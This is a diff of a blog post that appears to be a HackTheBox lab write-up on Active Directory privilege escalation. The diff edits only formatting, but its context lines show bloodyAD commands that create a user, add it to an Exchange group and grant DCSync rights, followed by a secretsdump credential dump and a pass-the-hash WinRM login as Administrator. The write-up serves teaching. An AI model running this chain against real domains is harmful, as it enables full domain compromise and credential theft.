@@ -5,6 +5,8 @@ author: victor_contreras
 date: 2026-01-26
 categories: [Active Directory, DACLs]
 tags: [Active Directory, DACLs, bloodyAD, impacket-secretsdump]
+math: true
+mermaid: true
 image:
   path: /assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/2026-01-26-Account-Operators-and-Exchange-Windows-Permissions.jpg
   alt: Silhouette of Woman Holding Lantern in Night
@@ -35,7 +37,7 @@ We will use `bloodyAD` to perform create a user, modify a group and permissions.
 
 1. Create a new domain user:
 
-```Bash
+```bash
 bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add user 'evil' 'EvilMachine1!'
 ```
 
@@ -43,7 +45,7 @@ bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add user 'evil' 
 
 2. Add the user to the Exchange group:
 
-```Bash
+```bash
 bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add groupMember "Exchange Trusted Subsystem" 'evil'
 ```
 
@@ -54,7 +56,7 @@ Note for this example:
 
 3. Grant DCSync permissions to the new user:
 
-```Bash
+```bash
 bloodyAD --host 10.129.95.210 -d HTB -u evil -p 'EvilMachine1!' add dcsync evil
 ```
 
@@ -62,7 +64,7 @@ bloodyAD --host 10.129.95.210 -d HTB -u evil -p 'EvilMachine1!' add dcsync evil
 
 4. Perform a DCSync attack to obtain all the credentials from the domain controller:
 
-```Bash
+```bash
 impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
 ```
 
@@ -70,7 +72,7 @@ impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
 
 5. Finally, we can use the NTHash to log in as the administrator using the Windows Remote Management (WinRM) service:
 
-```Bash
+```bash
 evil-winrm -i 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
